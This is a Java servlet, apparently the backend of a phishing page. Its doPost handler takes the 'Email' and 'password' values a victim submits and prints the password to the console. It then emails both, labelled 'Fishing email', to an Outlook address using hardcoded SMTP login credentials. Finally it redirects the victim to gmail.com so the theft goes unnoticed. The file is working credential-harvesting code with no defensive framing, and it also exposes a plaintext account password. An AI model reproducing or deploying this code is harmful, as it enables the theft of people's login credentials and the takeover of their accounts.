package com.fishing;

import java.io.IOException;
import java.util.Date;
import java.util.Properties;

import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.SendFailedException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.servlet.ServletException;
//import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class Servlet1
 * @WebServlet("/Servlet1")
 */

public class Servlet1 extends HttpServlet {
	private static final long serialVersionUID = 1L;

    /**
     * Default constructor. 
     */
    public Servlet1() {
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		response.getWriter().append("Served at: ").append(request.getContextPath());
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		System.out.println("FFFFF");
		String email = request.getParameter("Email");
		String password = request.getParameter("password");
		System.out.println("FFFFF "+request.getParameter("password"));
		
		final String validEmail = "mandango.fast@outlook.com";
		final String validPassword = "Mandango@12345";
		Properties props = new Properties();
		props.put("mail.smtp.host", "smtp-mail.outlook.com");
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		
		props.put("mail.smtp.port", "587");

		if (true) props.put("mail.debug", "true");

		Session session = Session.getInstance(props,
				  new javax.mail.Authenticator() {
					protected PasswordAuthentication getPasswordAuthentication() {
						return new PasswordAuthentication(validEmail, validPassword);
					}
				  });
		session.setDebug(true);
		try {
		    // create a message
		    MimeMessage msg = new MimeMessage(session);
		    msg.setFrom(new InternetAddress("fishing@fisher.com"));
		    InternetAddress[] address = {new InternetAddress("mandango.fast@outlook.com")};
		    msg.setRecipients(Message.RecipientType.TO, address);
		    msg.setSubject("JavaMail APIs Test");
		    msg.setSentDate(new Date());
		    // If the desired charset is known, you can use
		    // setText(text, charset)
		    msg.setText("Fishing email: "+email+" password: "+password);
		    
		    Transport.send(msg);
		} catch (MessagingException mex) {
		    System.out.println("\n--Exception handling in msgsendsample.java");

		    mex.printStackTrace();
		    System.out.println();
		    Exception ex = mex;
		    do {
			if (ex instanceof SendFailedException) {
			    SendFailedException sfex = (SendFailedException)ex;
			    Address[] invalid = sfex.getInvalidAddresses();
			    if (invalid != null) {
				System.out.println("    ** Invalid Addresses");
				for (int i = 0; i < invalid.length; i++) 
				    System.out.println("         " + invalid[i]);
			    }
			    Address[] validUnsent = sfex.getValidUnsentAddresses();
			    if (validUnsent != null) {
				System.out.println("    ** ValidUnsent Addresses");
				for (int i = 0; i < validUnsent.length; i++) 
				    System.out.println("         "+validUnsent[i]);
			    }
			    Address[] validSent = sfex.getValidSentAddresses();
			    if (validSent != null) {
				System.out.println("    ** ValidSent Addresses");
				for (int i = 0; i < validSent.length; i++) 
				    System.out.println("         "+validSent[i]);
			    }
			}
			System.out.println();
			if (ex instanceof MessagingException)
			    ex = ((MessagingException)ex).getNextException();
			else
			    ex = null;
		    } while (ex != null);
		}
		response.sendRedirect("http://www.gmail.com");
	}

}
